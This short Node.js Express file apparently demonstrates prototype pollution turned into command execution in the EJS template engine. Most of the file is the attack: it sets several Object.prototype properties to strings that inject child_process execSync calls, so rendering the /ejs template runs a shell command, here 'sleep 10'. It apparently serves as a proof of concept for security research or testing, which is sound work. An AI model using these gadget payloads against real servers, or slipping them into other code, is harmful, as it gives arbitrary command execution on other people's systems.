const express = require('express');

const app = express();
app.set('view engine', 'ejs');
app.set('views', __dirname + '/views');

cmd = "sleep 10";

Object.prototype.outputFunctionName = `a;process.mainModule.require('child_process').execSync('${cmd}');//`;
Object.prototype.client = "notEmpty"; Object.prototype.escapeFunction = '`${process.mainModule.require(\'child_process\').execSync(\'' + cmd + '\')}`';
Object.prototype.client = "notEmpty"; Object.prototype.escape = '`${process.mainModule.require(\'child_process\').execSync(\'' + cmd + '\')}`';
Object.prototype.localsName = `a=process.mainModule.require('child_process').execSync('${cmd}')`;
Object.prototype.destructuredLocals = ["/*", `*/a=process.mainModule.require('child_process').execSync('${cmd}');//`];

app.get('/ejs', (req, res) => {
    res.render('template', {foo: "bar"})
})

app.listen(1337);
